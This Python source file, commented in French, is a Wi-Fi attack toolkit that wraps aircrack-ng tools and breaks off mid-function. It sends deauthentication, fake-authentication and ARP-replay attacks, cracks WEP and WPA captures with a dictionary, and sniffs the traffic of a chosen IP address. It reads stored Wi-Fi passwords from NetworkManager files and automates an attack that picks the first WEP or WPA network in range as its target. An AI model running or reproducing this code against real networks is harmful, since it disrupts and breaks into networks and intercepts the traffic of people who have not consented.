import subprocess
import time
import os
import json
import csv
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import requests
import re
import logging
from functools import lru_cache
from scapy.all import sniff, IP, TCP, UDP, ICMP, wrpcap
import tkinter as tk
from tkinter import ttk

# Initialisation de la console et du système de journalisation
console = Console()
logging.basicConfig(filename='wifi_tool.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# ====== FONCTIONS UTILITAIRES ======
def valider_mac(mac):
    """Valide le format d'une adresse MAC."""
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def valider_interface(iface):
    """Valide le nom d'une interface réseau."""
    pattern = r'^[a-zA-Z0-9]+$'
    return bool(re.match(pattern, iface))

def valider_ip(ip):
    """Valide le format d'une adresse IP."""
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    return bool(re.match(pattern, ip))

@lru_cache(maxsize=1000)
def obtenir_fabricant(mac):
    """Récupère le fabricant à partir d'une adresse MAC avec mise en cache."""
    if not valider_mac(mac):
        return "MAC invalide"
    try:
        response = requests.get(f'https://api.macvendors.com/{mac}', timeout=5)
        return response.text if response.status_code == 200 else "Inconnu"
    except requests.RequestException as e:
        logging.error(f"Échec de la recherche MAC pour {mac}: {e}")
        return "Erreur"

# ====== OBTENIR LE RÉSEAU CONNECTÉ ======
def obtenir_reseau_connecte(interface):
    """Récupère le SSID et le BSSID du réseau auquel l'interface est connectée."""
    try:
        resultat = subprocess.run(['iwconfig', interface], capture_output=True, text=True, check=True)
        sortie = resultat.stdout
        ssid_match = re.search(r'ESSID:"([^"]+)"', sortie)
        bssid_match = re.search(r'Access Point: ([0-9A-Fa-f:]{17})', sortie)
        if ssid_match and bssid_match:
            return {"ssid": ssid_match.group(1), "bssid": bssid_match.group(1)}
        console.print("[red]Aucun réseau connecté détecté sur cette interface.[/red]")
        logging.warning(f"Aucun réseau connecté détecté sur {interface}")
        return None
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur lors de la vérification du réseau : {e}[/red]")
        logging.error(f"Erreur lors de la vérification du réseau sur {interface}: {e}")
        return None

# ====== SURVEILLANCE DU TRAFIC IP ======
def surveiller_trafic_ip(interface, ip_cible, duree=30):
    """Surveille le trafic réseau pour une adresse IP donnée et affiche un résumé."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return
    if not valider_ip(ip_cible):
        console.print("[red]Adresse IP invalide ![/red]")
        return

    # Créer un dossier pour stocker les captures
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"trafic_ip_{ip_cible.replace('.', '_')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_pcap = os.path.join(dossier_capture, f"capture_ip_{horodatage}.pcap")

    console.print(f"[bold yellow]Surveillance du trafic pour l'IP {ip_cible} sur {interface} pendant {duree} secondes...[/bold yellow]")

    # Liste pour stocker les informations des paquets
    paquets_info = []

    def traiter_paquet(paquet):
        """Fonction de callback pour traiter chaque paquet capturé."""
        if IP in paquet:
            ip_src = paquet[IP].src
            ip_dst = paquet[IP].dst
            if ip_src == ip_cible or ip_dst == ip_cible:
                proto = "Inconnu"
                port_src = "-"
                port_dst = "-"
                taille = len(paquet)

                if TCP in paquet:
                    proto = "TCP"
                    port_src = str(paquet[TCP].sport)
                    port_dst = str(paquet[TCP].dport)
                elif UDP in paquet:
                    proto = "UDP"
                    port_src = str(paquet[UDP].sport)
                    port_dst = str(paquet[UDP].dport)
                elif ICMP in paquet:
                    proto = "ICMP"

                paquets_info.append({
                    "ip_src": ip_src,
                    "ip_dst": ip_dst,
                    "protocole": proto,
                    "port_src": port_src,
                    "port_dst": port_dst,
                    "taille": taille,
                    "horodatage": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })

    # Capturer les paquets
    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Capture des paquets...", total=duree)
            paquets = sniff(iface=interface, filter=f"ip host {ip_cible}", timeout=duree, prn=traiter_paquet)
            progress.update(tache, advance=duree)

        # Sauvegarder les paquets capturés dans un fichier .pcap
        if paquets:
            wrpcap(fichier_pcap, paquets)
            console.print(f"[green]Paquets sauvegardés dans {fichier_pcap}[/green]")
            logging.info(f"Capture de trafic IP sauvegardée dans {fichier_pcap}")
        else:
            console.print(f"[yellow]Aucun paquet capturé pour l'IP {ip_cible}.[/yellow]")
            logging.info(f"Aucun paquet capturé pour l'IP {ip_cible}")

        # Afficher un tableau récapitulatif
        tableau_trafic = Table(title=f"Trafic réseau pour l'IP {ip_cible}")
        tableau_trafic.add_column("Horodatage", style="cyan")
        tableau_trafic.add_column("IP Source", style="magenta")
        tableau_trafic.add_column("IP Destination", style="yellow")
        tableau_trafic.add_column("Protocole", style="green")
        tableau_trafic.add_column("Port Source", style="blue")
        tableau_trafic.add_column("Port Destination", style="blue")
        tableau_trafic.add_column("Taille (octets)", style="white")

        for info in paquets_info:
            tableau_trafic.add_row(
                info["horodatage"],
                info["ip_src"],
                info["ip_dst"],
                info["protocole"],
                info["port_src"],
                info["port_dst"],
                str(info["taille"])
            )

        console.print(tableau_trafic)
        logging.info(f"Trafic réseau analysé pour l'IP {ip_cible}: {len(paquets_info)} paquets capturés")

    except KeyboardInterrupt:
        console.print("[red]Capture arrêtée par l'utilisateur[/red]")
        logging.info("Capture de trafic IP arrêtée par l'utilisateur")
    except Exception as e:
        console.print(f"[red]Erreur lors de la capture du trafic : {e}[/red]")
        logging.error(f"Erreur lors de la capture du trafic IP {ip_cible}: {e}")

# ====== SCAN WIFI EN TEMPS RÉEL ======
def scan_wifi_temps_reel(interface, signal_min=-70, fichier_sortie=None):
    """Scanne les réseaux Wi-Fi en mode moniteur avec filtre d'intensité de signal."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return None

    console.print(f"[bold yellow]Scan Wi-Fi en mode moniteur sur {interface}...[/bold yellow]")
    for f in ["scan_temp-01.csv", "scan_temp.csv"]:
        if os.path.exists(f):
            os.remove(f)

    proc = subprocess.Popen(['sudo', 'airodump-ng', '--output-format', 'csv', '-w', 'scan_temp', interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    resultats = {"points_acces": [], "clients": []}
    with Progress() as progress:
        tache = progress.add_task("[cyan]Scan en cours...", total=100)
        try:
            time.sleep(10)  # Attendre pour collecter des données
            if not os.path.exists('scan_temp-01.csv'):
                console.print("[red]Aucune donnée collectée.[/red]")
                return None
            try:
                with open('scan_temp-01.csv', 'r', encoding='utf-8', errors='ignore') as f:
                    donnees = f.read()
            except Exception as e:
                console.print(f"[red]Erreur de lecture des données : {e}[/red]")
                return None

            sections = donnees.split("Station MAC")
            section_ap = sections[0].splitlines()[2:]  # Sauter les deux premières lignes (en-tête + ligne vide)
            section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []  # Sauter l'en-tête des clients

            # Tableau des points d'accès
            tableau_ap = Table(title="Points d'accès Wi-Fi détectés")
            tableau_ap.add_column("SSID", style="cyan")
            tableau_ap.add_column("BSSID (MAC)", style="magenta")
            tableau_ap.add_column("Sécurité", style="yellow")
            tableau_ap.add_column("Signal (dBm)", style="green")
            tableau_ap.add_column("Fabricant", style="blue")
            aps = []
            for ligne in section_ap:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 14 and champs[0] and champs[8].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[8])
                        if signal >= signal_min:
                            bssid = champs[0]
                            ssid = champs[13] if champs[13].strip() else "<Masqué>"
                            securite = champs[5]
                            canal = champs[3]
                            fabricant = obtenir_fabricant(bssid)
                            tableau_ap.add_row(ssid, bssid, securite, str(signal), fabricant)
                            aps.append({"ssid": ssid, "bssid": bssid, "securite": securite, "signal": signal, "canal": canal, "fabricant": fabricant})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal pour la ligne {ligne}: {e}")
                        continue

            # Tableau des clients
            tableau_clients = Table(title="Clients connectés")
            tableau_clients.add_column("BSSID AP", style="magenta")
            tableau_clients.add_column("MAC Client", style="cyan")
            tableau_clients.add_column("Fabricant", style="yellow")
            tableau_clients.add_column("Signal (dBm)", style="green")
            clients = []
            for ligne in section_clients:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[3])
                        if signal >= signal_min:
                            mac_client = champs[0]
                            bssid_ap = champs[5]
                            fabricant = obtenir_fabricant(mac_client)
                            tableau_clients.add_row(bssid_ap, mac_client, fabricant, str(signal))
                            clients.append({"mac_client": mac_client, "bssid_ap": bssid_ap, "signal": signal, "fabricant": fabricant})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")
                        continue

            resultats["points_acces"] = aps
            resultats["clients"] = clients
            console.clear()
            console.print(tableau_ap)
            console.print(tableau_clients)
            progress.update(tache, advance=100)

        except KeyboardInterrupt:
            proc.terminate()
            console.print("[red]Scan arrêté par l'utilisateur[/red]")
            logging.info("Scan Wi-Fi arrêté par l'utilisateur")
            return None
        finally:
            proc.terminate()

    # Sauvegarde des résultats si demandée
    if fichier_sortie:
        horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(f"{fichier_sortie}_{horodatage}.json", 'w') as f:
            json.dump(resultats, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_sortie}_{horodatage}.json[/green]")
        logging.info(f"Résultats du scan sauvegardés dans {fichier_sortie}_{horodatage}.json")
    
    return resultats

# ====== DÉTECTION DES VULNÉRABILITÉS WIFI ======
def detecter_vulnerabilites_wifi(interface):
    """Scanne les réseaux Wi-Fi pour détecter WPS et SSID masqué."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return

    console.print(f"[bold yellow]Détection des vulnérabilités Wi-Fi sur {interface}...[/bold yellow]")
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_vuln = f"vulnerabilites_{horodatage}"
    os.makedirs(dossier_vuln, exist_ok=True)
    fichier_csv = os.path.join(dossier_vuln, f"scan_vuln_{horodatage}")
    fichier_wash = os.path.join(dossier_vuln, f"wash_vuln_{horodatage}.json")

    # Lancer airodump-ng pour scanner les réseaux
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--output-format', 'csv', '-w', fichier_csv, interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Lancer wash pour détecter WPS
    proc_wash = subprocess.Popen(['sudo', 'wash', '-i', interface, '-j', '-o', fichier_wash],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Scan des vulnérabilités...", total=10)
            time.sleep(10)  # Attendre pour collecter des données
            progress.update(tache, advance=10)

        # Lire les données de airodump-ng
        fichier_csv_path = f"{fichier_csv}-01.csv"
        reseaux = []
        if os.path.exists(fichier_csv_path):
            with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                donnees = f.read()
            section_ap = donnees.split("Station MAC")[0].splitlines()[2:]
            for ligne in section_ap:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 14 and champs[0]:
                    ssid = champs[13] if champs[13].strip() else "<Masqué>"
                    reseaux.append({
                        "ssid": ssid,
                        "bssid": champs[0],
                        "securite": champs[5],
                        "signal": champs[8],
                        "ssid_masque": ssid == "<Masqué>",
                        "wps": False  # Initialisé, mis à jour avec wash
                    })

        # Lire les données de wash pour WPS
        wps_data = {}
        if os.path.exists(fichier_wash):
            with open(fichier_wash, 'r') as f:
                try:
                    wps_data = json.load(f)
                except json.JSONDecodeError:
                    console.print("[yellow]Aucune donnée WPS valide détectée.[/yellow]")
            for item in wps_data:
                wps_data[item["bssid"]] = item.get("wps", False)

        # Combiner les données
        for reseau in reseaux:
            reseau["wps"] = wps_data.get(reseau["bssid"], False)

        # Afficher un tableau récapitulatif
        tableau = Table(title="Vulnérabilités des réseaux Wi-Fi")
        tableau.add_column("SSID", style="cyan")
        tableau.add_column("BSSID", style="magenta")
        tableau.add_column("Sécurité", style="yellow")
        tableau.add_column("Signal (dBm)", style="green")
        tableau.add_column("WPS", style="red")
        tableau.add_column("SSID Masqué", style="blue")

        for reseau in reseaux:
            tableau.add_row(
                reseau["ssid"],
                reseau["bssid"],
                reseau["securite"],
                reseau["signal"],
                "Activé" if reseau["wps"] else "Désactivé",
                "Oui" if reseau["ssid_masque"] else "Non"
            )

        console.print(tableau)
        logging.info(f"Détection des vulnérabilités terminée: {len(reseaux)} réseaux analysés")

        # Sauvegarder les résultats
        fichier_json = os.path.join(dossier_vuln, f"vulnerabilites_{horodatage}.json")
        with open(fichier_json, 'w') as f:
            json.dump(reseaux, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_json}[/green]")
        logging.info(f"Résultats des vulnérabilités sauvegardés dans {fichier_json}")

    except KeyboardInterrupt:
        proc.terminate()
        proc_wash.terminate()
        console.print("[red]Scan arrêté par l'utilisateur[/red]")
        logging.info("Scan des vulnérabilités arrêté par l'utilisateur")
    except Exception as e:
        console.print(f"[red]Erreur lors de la détection des vulnérabilités : {e}[/red]")
        logging.error(f"Erreur lors de la détection des vulnérabilités : {e}")
    finally:
        proc.terminate()
        proc_wash.terminate()
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv", fichier_wash]:
            if os.path.exists(f):
                os.remove(f)

# ====== SURVEILLANCE EN TEMPS RÉEL AVEC GUI ======
def surveiller_clients_gui(interface):
    """Affiche une interface graphique pour surveiller les clients connectés en temps réel."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return

    # Vérifier si l'interface est connectée à un réseau
    reseau = obtenir_reseau_connecte(interface)
    if not reseau:
        console.print("[red]Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.[/red]")
        return

    ssid = reseau["ssid"]
    bssid = reseau["bssid"]
    console.print(f"[bold yellow]Lancement de la surveillance en temps réel pour {ssid} ({bssid})...[/bold yellow]")

    # Créer un dossier pour les captures temporaires
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"clients_gui_{bssid.replace(':', '')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_csv = os.path.join(dossier_capture, f"scan_clients_{horodatage}")

    # Initialiser la fenêtre Tkinter
    fenetre = tk.Tk()
    fenetre.title(f"Surveillance des clients - {ssid} ({bssid})")
    fenetre.geometry("800x400")

    # Créer un tableau avec Tkinter
    tableau = ttk.Treeview(fenetre, columns=("MAC", "Fabricant", "Signal"), show="headings")
    tableau.heading("MAC", text="MAC Client")
    tableau.heading("Fabricant", text="Fabricant")
    tableau.heading("Signal", text="Signal (dBm)")
    tableau.pack(fill="both", expand=True)

    # Bouton pour arrêter la surveillance
    running = tk.BooleanVar(value=True)
    def arreter_surveillance():
        running.set(False)
        fenetre.destroy()

    bouton_arret = tk.Button(fenetre, text="Arrêter la surveillance", command=arreter_surveillance)
    bouton_arret.pack(pady=10)

    def actualiser_tableau():
        """Met à jour le tableau avec les clients détectés."""
        if not running.get():
            return

        # Lancer airodump-ng pour capturer les clients
        proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--output-format', 'csv', '-w', fichier_csv, interface],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(5)  # Attendre pour collecter des données
        proc.terminate()

        # Lire les données
        fichier_csv_path = f"{fichier_csv}-01.csv"
        clients = []
        if os.path.exists(fichier_csv_path):
            with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                donnees = f.read()
            sections = donnees.split("Station MAC")
            section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []
            for ligne in section_clients:
                champs = [f.strip() for f in ligne.split(",")]
                if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                    try:
                        signal = int(champs[3])
                        mac_client = champs[0]
                        fabricant = obtenir_fabricant(mac_client)
                        clients.append({"mac_client": mac_client, "fabricant": fabricant, "signal": signal})
                    except ValueError as e:
                        logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")

        # Mettre à jour le tableau Tkinter
        for item in tableau.get_children():
            tableau.delete(item)
        for client in clients:
            tableau.insert("", "end", values=(client["mac_client"], client["fabricant"], str(client["signal"])))

        # Nettoyer les fichiers temporaires
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv"]:
            if os.path.exists(f):
                os.remove(f)

        # Planifier la prochaine mise à jour
        if running.get():
            fenetre.after(5000, actualiser_tableau)

    try:
        actualiser_tableau()
        fenetre.mainloop()
        logging.info(f"Surveillance en temps réel terminée pour {ssid} ({bssid})")
    except Exception as e:
        console.print(f"[red]Erreur lors de la surveillance en temps réel : {e}[/red]")
        logging.error(f"Erreur lors de la surveillance en temps réel : {e}")
    finally:
        # Nettoyer le dossier si vide
        if os.path.exists(dossier_capture) and not os.listdir(dossier_capture):
            os.rmdir(dossier_capture)

# ====== SCAN WIFI NORMAL ======
def scan_wifi_normal():
    """Scanne les réseaux Wi-Fi en mode géré."""
    console.print("[bold yellow]Scan Wi-Fi en mode normal...[/bold yellow]")
    try:
        resultat = subprocess.run(['nmcli', '-f', 'SSID,BSSID,SECURITY,SIGNAL', 'dev', 'wifi'], 
                                capture_output=True, text=True, check=True)
        sortie = resultat.stdout
        tableau = Table(title="Réseaux Wi-Fi détectés")
        tableau.add_column("SSID", style="cyan")
        tableau.add_column("BSSID (MAC)", style="magenta")
        tableau.add_column("Sécurité", style="yellow")
        tableau.add_column("Signal (%)", style="green")
        lignes = sortie.strip().split('\n')[1:]
        for ligne in lignes:
            parties = ligne.split()
            if len(parties) >= 3:
                ssid = " ".join(parties[:-2])
                bssid = parties[-2]
                securite = parties[-1]
                signal = parties[-1]
                tableau.add_row(ssid, bssid, securite, signal)
        console.print(tableau)
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur pendant le scan : {e}[/red]")
        logging.error(f"Erreur de scan normal : {e}")

# ====== DÉTECTION DU MODE ET SCAN ======
def scan_wifi():
    """Détecte le mode de l'interface et lance le scan approprié."""
    try:
        resultat = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
        interface_moniteur = None
        for ligne in resultat.stdout.splitlines():
            if 'Mode:Monitor' in ligne:
                interface_moniteur = ligne.split()[0]
                break
        signal_min = input("Entrez l'intensité minimale du signal (ex. -70 dBm, appuyez sur Entrée pour défaut) : ").strip()
        signal_min = int(signal_min) if signal_min else -70
        fichier_sortie = input("Sauvegarder les résultats dans un fichier ? Entrez le nom (ou Entrée pour ignorer) : ").strip()
        if interface_moniteur:
            return scan_wifi_temps_reel(interface_moniteur, signal_min, fichier_sortie or None)
        else:
            scan_wifi_normal()
            return None
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Erreur de détection de l'interface : {e}[/red]")
        logging.error(f"Erreur de détection d'interface : {e}")
        return None

# ====== DÉCHIFFREMENT FICHIER .CAP ======
def dechiffrer_cap(fichier_cap, type_securite, fichier_dico=None):
    """Déchiffre un fichier .cap pour WEP ou WPA/WPA2."""
    if not os.path.exists(fichier_cap):
        console.print("[red]Le fichier n'existe pas ![/red]")
        return False

    if type_securite == 'WEP':
        console.print(f"[green]Déchiffrement WEP du fichier {fichier_cap}...[/green]")
        console.print("[yellow]Assurez-vous d'avoir suffisamment de paquets IV pour réussir.[/yellow]")
        resultat = subprocess.run(['aircrack-ng', fichier_cap], capture_output=True, text=True, check=False)
        console.print(resultat.stdout)
        return "KEY FOUND" in resultat.stdout
    elif type_securite == 'WPA':
        if not fichier_dico or not os.path.exists(fichier_dico):
            console.print("[red]Fichier dictionnaire requis pour WPA/WPA2 ![/red]")
            return False
        console.print(f"[green]Attaque par dictionnaire sur {fichier_cap} avec {fichier_dico}...[/green]")
        resultat = subprocess.run(['aircrack-ng', '-w', fichier_dico, fichier_cap], capture_output=True, text=True, check=False)
        console.print(resultat.stdout)
        return "KEY FOUND" in resultat.stdout
    else:
        console.print("[red]Type de sécurité invalide ![/red]")
        return False

# ====== ATTAQUES WIFI ======
def attaquer_wifi(bssid, interface, canal, type_attaque):
    """Effectue des attaques Wi-Fi avec aireplay-ng."""
    if not valider_mac(bssid):
        console.print("[red]Format de BSSID invalide ![/red]")
        return False
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return False
    if not canal.isdigit() or not 1 <= int(canal) <= 14:
        console.print("[red]Canal invalide (doit être entre 1 et 14) ![/red]")
        return False

    console.print(f"[bold yellow]Réglage de {interface} sur le canal {canal}...[/bold yellow]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)

    if type_attaque == 'deauth':
        console.print(f"[green]Envoi de déauthentification à {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', bssid, interface], check=False)
        return True
    elif type_attaque == 'fakeauth':
        console.print(f"[green]Fake auth sur {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--fakeauth', '10', '-a', bssid, interface], check=False)
        return True
    elif type_attaque == 'arpreplay':
        console.print(f"[green]Injection ARP sur {bssid} sur le canal {canal}...[/green]")
        subprocess.run(['sudo', 'aireplay-ng', '--arpreplay', '-b', bssid, interface], check=False)
        return True
    else:
        console.print("[red]Type d'attaque invalide ![/red]")
        return False

# ====== HISTORIQUE WIFI ======
def historique_wifi():
    """Affiche les réseaux Wi-Fi enregistrés avec leurs détails."""
    console.print("[bold yellow]Historique des connexions Wi-Fi[/bold yellow]")
    chemin_nm = "/etc/NetworkManager/system-connections/"
    tableau = Table(title="Réseaux Wi-Fi enregistrés")
    tableau.add_column("SSID", style="cyan")
    tableau.add_column("UUID", style="magenta")
    tableau.add_column("Type", style="yellow")
    tableau.add_column("Mot de passe", style="green")
    tableau.add_column("BSSID", style="red")

    try:
        fichiers = os.listdir(chemin_nm)
        for fichier in fichiers:
            chemin_fichier = os.path.join(chemin_nm, fichier)
            ssid = fichier
            uuid = "N/A"
            type_conn = "wifi"
            mot_de_passe = "N/A"
            bssid = "N/A"
            try:
                with open(chemin_fichier, 'r', encoding='utf-8') as f:
                    lignes = f.readlines()
                    for ligne in lignes:
                        ligne = ligne.strip()
                        if ligne.startswith("psk="):
                            mot_de_passe = ligne.split('=', 1)[1]
                        elif ligne.startswith("uuid="):
                            uuid = ligne.split('=', 1)[1]
                        elif ligne.startswith("type="):
                            type_conn = ligne.split('=', 1)[1]
                        elif ligne.startswith("bssid="):
                            bssid = ligne.split('=', 1)[1]
            except PermissionError:
                mot_de_passe = "N/A (root requis)"
            tableau.add_row(ssid, uuid, type_conn, mot_de_passe, bssid)
        console.print(tableau)
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")
        logging.error(f"Erreur dans l'historique Wi-Fi : {e}")

# ====== COMPTER LES APPAREILS CONNECTÉS ======
def compter_appareils_connectes(interface):
    """Compte les appareils connectés au réseau auquel l'interface est connectée."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return 0

    # Vérifier si l'interface est connectée à un réseau
    reseau = obtenir_reseau_connecte(interface)
    if not reseau:
        console.print("[red]Vous devez être connecté à un réseau Wi-Fi pour utiliser cette fonction.[/red]")
        return 0

    ssid = reseau["ssid"]
    bssid = reseau["bssid"]
    console.print(f"[bold yellow]Comptage des appareils connectés au réseau {ssid} ({bssid})...[/bold yellow]")

    # Créer un dossier pour stocker les captures
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_capture = f"clients_{bssid.replace(':', '')}_{horodatage}"
    os.makedirs(dossier_capture, exist_ok=True)
    fichier_csv = os.path.join(dossier_capture, f"scan_clients_{horodatage}")

    # Lancer airodump-ng avec filtre sur le BSSID
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--output-format', 'csv', '-w', fichier_csv, interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    clients = []
    try:
        with Progress() as progress:
            tache = progress.add_task("[cyan]Collecte des données...", total=10)
            time.sleep(5)  # Attendre pour collecter des données
            progress.update(tache, advance=10)

        fichier_csv_path = f"{fichier_csv}-01.csv"
        if not os.path.exists(fichier_csv_path):
            console.print("[red]Aucune donnée collectée.[/red]")
            return 0

        with open(fichier_csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            donnees = f.read()

        sections = donnees.split("Station MAC")
        section_clients = sections[1].splitlines()[2:] if len(sections) > 1 else []

        # Tableau des clients connectés
        tableau_clients = Table(title=f"Clients connectés au réseau {ssid} ({bssid})")
        tableau_clients.add_column("MAC Client", style="cyan")
        tableau_clients.add_column("Fabricant", style="yellow")
        tableau_clients.add_column("Signal (dBm)", style="green")

        for ligne in section_clients:
            champs = [f.strip() for f in ligne.split(",")]
            if len(champs) >= 6 and champs[0] and champs[3].strip().lstrip('-').isdigit():
                try:
                    signal = int(champs[3])
                    mac_client = champs[0]
                    fabricant = obtenir_fabricant(mac_client)
                    tableau_clients.add_row(mac_client, fabricant, str(signal))
                    clients.append({"mac_client": mac_client, "fabricant": fabricant, "signal": signal})
                except ValueError as e:
                    logging.warning(f"Erreur de conversion du signal client pour la ligne {ligne}: {e}")
                    continue

        nombre_clients = len(clients)
        console.print(tableau_clients)
        console.print(f"[green]Nombre d'appareils connectés au réseau {ssid} : {nombre_clients}[/green]")
        logging.info(f"Nombre d'appareils connectés au réseau {ssid} ({bssid}) : {nombre_clients}")

        # Sauvegarder les résultats en JSON
        resultat = {"ssid": ssid, "bssid": bssid, "clients": clients}
        fichier_json = os.path.join(dossier_capture, f"clients_{horodatage}.json")
        with open(fichier_json, 'w') as f:
            json.dump(resultat, f, indent=4)
        console.print(f"[green]Résultats sauvegardés dans {fichier_json}[/green]")
        logging.info(f"Résultats des clients sauvegardés dans {fichier_json}")

        return nombre_clients

    except KeyboardInterrupt:
        proc.terminate()
        console.print("[red]Scan arrêté par l'utilisateur[/red]")
        logging.info("Scan du nombre d'appareils arrêté par l'utilisateur")
        return 0
    except Exception as e:
        console.print(f"[red]Erreur : {e}[/red]")
        logging.error(f"Erreur de comptage des appareils : {e}")
        return 0
    finally:
        proc.terminate()
        # Nettoyer les fichiers temporaires
        for f in [f"{fichier_csv}-01.csv", f"{fichier_csv}.csv"]:
            if os.path.exists(f):
                os.remove(f)

# ====== CAPTURER DES PAQUETS ======
def capturer_paquets(bssid, interface, canal, fichier_sortie=None):
    """Capture des paquets pour un BSSID spécifique."""
    if not valider_mac(bssid):
        console.print("[red]Format de BSSID invalide ![/red]")
        return False
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return False
    if not canal.isdigit() or not 1 <= int(canal) <= 14:
        console.print("[red]Canal invalide (doit être entre 1 et 14) ![/red]")
        return False
    if not fichier_sortie:
        fichier_sortie = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    console.print(f"[bold yellow]Capture des paquets pour {bssid} sur le canal {canal}...[/bold yellow]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--bssid', bssid, '--channel', canal, '--write', fichier_sortie, interface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(15)  # Attendre pour capturer un handshake
        console.print(f"[green]Paquets sauvegardés dans {fichier_sortie}.cap[/green]")
        logging.info(f"Capture de paquets sauvegardée dans {fichier_sortie}.cap")
        return True
    except KeyboardInterrupt:
        proc.terminate()
        console.print("[red]Capture arrêtée par l'utilisateur[/red]")
        return False
    finally:
        proc.terminate()

# ====== ATTAQUE AUTOMATISÉE ======
def attaque_automatisee(interface, fichier_dico=None):
    """Automatise une attaque Wi-Fi : scan, capture de paquets, déauthentification, déchiffrement."""
    if not valider_interface(interface):
        console.print("[red]Nom d'interface invalide ![/red]")
        return

    console.print("[bold yellow]Lancement d'une attaque Wi-Fi automatisée...[/bold yellow]")

    # Étape 1 : Scanner les réseaux
    console.print("[cyan]Étape 1 : Scan des réseaux Wi-Fi...[/cyan]")
    resultats = scan_wifi_temps_reel(interface, signal_min=-70)
    if not resultats or not resultats["points_acces"]:
        console.print("[red]Aucun réseau détecté. Arrêt de l'attaque.[/red]")
        return

    # Sélectionner un réseau cible (privilégier WPA/WPA2 ou WEP)
    cible = None
    for ap in resultats["points_acces"]:
        if ap["securite"] in ["WPA", "WPA2", "WEP"]:
            cible = ap
            break
    if not cible:
        console.print("[red]Aucun réseau vulnérable (WEP ou WPA/WPA2) détecté.[/red]")
        return

    console.print(f"[green]Cible sélectionnée : {cible['ssid']} ({cible['bssid']}) - Sécurité : {cible['securite']}[/green]")
    logging.info(f"Cible sélectionnée : {cible['ssid']} ({cible['bssid']})")

    # Créer un dossier pour l'attaque
    horodatage = datetime.now().strftime("%Y%m%d_%H%M%S")
    dossier_attaque = f"attaque_{cible['bssid'].replace(':', '')}_{horodatage}"
    os.makedirs(dossier_attaque, exist_ok=True)
    console.print(f"[green]Dossier créé : {dossier_attaque}[/green]")
    logging.info(f"Dossier d'attaque créé : {dossier_attaque}")

    # Étape 2 : Régler le canal
    canal = cible["canal"]
    console.print(f"[cyan]Étape 2 : Réglage de l'interface sur le canal {canal}...[/cyan]")
    subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', canal], check=False)

    # Étape 3 : Lancer une attaque de déauthentification (si WPA/WPA2)
    deauth_status = "N/A"
    if cible["securite"] in ["WPA", "WPA2"]:
